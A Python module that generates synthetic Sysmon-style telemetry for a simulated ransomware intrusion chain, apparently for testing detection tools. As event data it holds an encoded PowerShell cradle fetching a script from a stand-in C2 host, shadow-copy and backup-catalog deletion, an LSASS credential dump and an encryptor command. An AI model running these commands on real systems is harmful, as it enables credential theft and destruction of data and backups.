"""
Ransomware Attack Simulator (APT-style intrusion chain)
Emits raw event dictionaries that mimic Windows Sysmon and Security event logs.
This module is a synthetic event generator only â€” it does not touch the network
or the filesystem.

Stages:
  1. Initial Access / Execution  - Office dropper -> PowerShell beacon -> C2
  2. Inhibit System Recovery     - vssadmin delete shadows (MITRE T1490)
  3. Lateral Movement Discovery  - internal SMB port-445 enumeration sweep
  4. Credential Access / Target  - LSASS dump + NTLM logon to backup vault
  5. Impact                      - encryptor staged against the backup vault
"""

import os
import hashlib
from typing import Dict, Any, List

# RFC 5737 documentation / test IP block (§2.27)
C2_IP = os.getenv("C2_IP", "203.0.113.49")
WKSTN04_IP = "192.168.1.50"

# Internal enterprise topology (deterministic lab addressing)
INTERNAL_HOSTS: Dict[str, str] = {
    "FILE-SRV": "192.168.1.10",
    "BACKUP-VAULT-01": "192.168.1.20",
    "DC01-PROD": "192.168.1.5",
    "WKSTN-09": "192.168.1.51",
    "WKSTN-12": "192.168.1.52",
}

STAGE_NARRATIVES: Dict[int, str] = {
    1: "Stage 1 - Initial Access: invoice.pdf.exe dropper spawned from WINWORD.EXE beacons to external C2.",
    2: "Stage 2 - Inhibit System Recovery: vssadmin deletes all shadow copies (MITRE T1490).",
    3: "Stage 3 - Lateral Discovery: internal SMB port-445 enumeration sweep across the domain.",
    4: "Stage 4 - Credential Access / Target Acquisition: LSASS dumped, NTLM logon to BACKUP-VAULT-01.",
    5: "Stage 5 - Impact: encryptor staged against the backup vault (outcome depends on containment).",
}


class RansomwareSimulator:
    """Generates raw event dicts. Pure data — zero side effects."""

    STAGE_NARRATIVES = STAGE_NARRATIVES

    def __init__(self, target_host: str = "WKSTN-04"):
        self.target_host = target_host

    # ------------------------------------------------------------------
    # Baseline topology (used by tests + GNN warm-up)
    # ------------------------------------------------------------------
    def get_baseline_network_topology(self) -> List[Dict[str, Any]]:
        """Events that build the enterprise graph with realistic multi-hop structure (§2.27)."""
        events: List[Dict[str, Any]] = []

        # Multi-hop hierarchy: WKSTN-04 -> FILE-SRV -> DC01-PROD -> BACKUP-VAULT-01 (§2.27)
        topology_edges = [
            (self.target_host, WKSTN04_IP, "FILE-SRV", INTERNAL_HOSTS["FILE-SRV"]),
            (self.target_host, WKSTN04_IP, "WKSTN-09", INTERNAL_HOSTS["WKSTN-09"]),
            (self.target_host, WKSTN04_IP, "WKSTN-12", INTERNAL_HOSTS["WKSTN-12"]),
            ("FILE-SRV", INTERNAL_HOSTS["FILE-SRV"], "DC01-PROD", INTERNAL_HOSTS["DC01-PROD"]),
            ("DC01-PROD", INTERNAL_HOSTS["DC01-PROD"], "BACKUP-VAULT-01", INTERNAL_HOSTS["BACKUP-VAULT-01"]),
        ]
        for src_host, src_ip, dst_host, dst_ip in topology_edges:
            events.append({
                "event_id": 3,
                "Computer": src_host,
                "user": "SYSTEM",
                "Image": "C:\\Windows\\System32\\svchost.exe",
                "SourceIp": src_ip,
                "DestinationIp": dst_ip,
                "DestinationPort": 445,
                "Protocol": "tcp",
            })

        # Inventory beacons so every internal host exists as a HOST node
        benign_proc = {
            "FILE-SRV": "fileserver_svc.exe",
            "BACKUP-VAULT-01": "backup_daemon.exe",
            "DC01-PROD": "w32time_svc.exe",
            "WKSTN-09": "chrome_update_check.exe",
            "WKSTN-12": "teams_machine_wide.exe",
        }
        for host, ip in INTERNAL_HOSTS.items():
            # Hashlib-based stable PID generation (§2.27)
            stable_pid = 1000 + (int(hashlib.md5(host.encode("utf-8")).hexdigest()[:4], 16) % 8000)
            events.append({
                "event_id": 1,
                "Computer": host,
                "user": "SYSTEM",
                "Image": f"C:\\Program Files\\SentinelLab\\{benign_proc[host]}",
                "CommandLine": f'"{benign_proc[host]}" --service',
                "ParentImage": "C:\\Windows\\System32\\services.exe",
                "ProcessId": stable_pid,
                "ParentProcessId": 512,
            })
            events.append({
                "event_id": 4624,
                "Computer": host,
                "user": "svc_inventory",
                "LogonType": 3,
                "IpAddress": WKSTN04_IP,
            })

        return events

    # ------------------------------------------------------------------
    # Stage event generation
    # ------------------------------------------------------------------
    def generate_stage(self, stage: int) -> List[Dict[str, Any]]:
        """Return the list of raw telemetry events for the requested stage."""
        if not isinstance(stage, int) or stage < 1 or stage > 5:
            raise ValueError(f"stage must be an integer between 1 and 5, got {stage!r}")

        generator = {
            1: self._stage1_initial_access,
            2: self._stage2_inhibit_recovery,
            3: self._stage3_lateral_discovery,
            4: self._stage4_credential_access,
            5: self._stage5_impact,
        }[stage]
        return generator()

    # ------------------------------------------------------------------
    # Individual stage definitions
    # ------------------------------------------------------------------
    def _stage1_initial_access(self) -> List[Dict[str, Any]]:
        return [
            {
                "event_id": 1,
                "Computer": self.target_host,
                "user": "j.malhotra",
                "Image": "C:\\Users\\j.malhotra\\Downloads\\invoice.pdf.exe",
                "CommandLine": "invoice.pdf.exe --silent",
                "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "ProcessId": 4820,
                "ParentProcessId": 2104,
            },
            {
                "event_id": 1,
                "Computer": self.target_host,
                "user": "j.malhotra",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AcwBlAG4AdABpAG4AZQBsAC4AbABvAGMAYQBsAC8AcAAuAHAAcwAxACcAKQA=",
                "ParentImage": "C:\\Users\\j.malhotra\\Downloads\\invoice.pdf.exe",
                "ProcessId": 5112,
                "ParentProcessId": 4820,
            },
            {
                "event_id": 3,
                "Computer": self.target_host,
                "user": "j.malhotra",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "SourceIp": WKSTN04_IP,
                "DestinationIp": C2_IP,
                "DestinationPort": 443,
                "Protocol": "tcp",
            },
        ]

    def _stage2_inhibit_recovery(self) -> List[Dict[str, Any]]:
        return [
            {
                "event_id": 1,
                "Computer": self.target_host,
                "user": "SYSTEM",
                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                "CommandLine": "vssadmin.exe delete shadows /all /quiet",
                "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "ProcessId": 6180,
                "ParentProcessId": 5112,
            },
            {
                "event_id": 1,
                "Computer": self.target_host,
                "user": "SYSTEM",
                "Image": "C:\\Windows\\System32\\wbadmin.exe",
                "CommandLine": "wbadmin.exe delete catalog -quiet",
                "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "ProcessId": 6188,
                "ParentProcessId": 5112,
            },
        ]

    def _stage3_lateral_discovery(self) -> List[Dict[str, Any]]:
        events: List[Dict[str, Any]] = []
        for host, ip in INTERNAL_HOSTS.items():
            events.append({
                "event_id": 3,
                "Computer": self.target_host,
                "user": "SYSTEM",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "SourceIp": WKSTN04_IP,
                "DestinationIp": ip,
                "DestinationPort": 445,
                "Protocol": "tcp",
            })
        events.append({
            "event_id": 1,
            "Computer": self.target_host,
            "user": "SYSTEM",
            "Image": "C:\\Windows\\System32\\net.exe",
            "CommandLine": "net.exe group \"Domain Admins\" /domain",
            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "ProcessId": 7012,
            "ParentProcessId": 5112,
        })
        return events

    def _stage4_credential_access(self) -> List[Dict[str, Any]]:
        return [
            {
                "event_id": 1,
                "Computer": self.target_host,
                "user": "SYSTEM",
                "Image": "C:\\Windows\\Temp\\procdump.exe",
                "CommandLine": "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
                "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "ProcessId": 7340,
                "ParentProcessId": 5112,
            },
            {
                "event_id": 4624,
                "Computer": "BACKUP-VAULT-01",
                "user": "svc_backup",
                "LogonType": 3,
                "IpAddress": WKSTN04_IP,
            },
        ]

    def _stage5_impact(self) -> List[Dict[str, Any]]:
        # Dropped dead f-string prefix (§2.27)
        vault_share = r"\\BACKUP-VAULT-01\\backup$"
        return [
            {
                "event_id": 1,
                "Computer": self.target_host,
                "user": "j.malhotra",
                "Image": "C:\\Windows\\Temp\\svhost64.exe",
                "CommandLine": f"svhost64.exe --encrypt --path {vault_share} --ext .locked",
                "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "ProcessId": 7702,
                "ParentProcessId": 6180,
            },
            {
                "event_id": 11,
                "Computer": "BACKUP-VAULT-01",
                "user": "svc_backup",
                "TargetFilename": "D:\\Backups\\2026-04-01-prod-db.bak.locked",
                "Image": "C:\\Windows\\Temp\\svhost64.exe",
            },
        ]
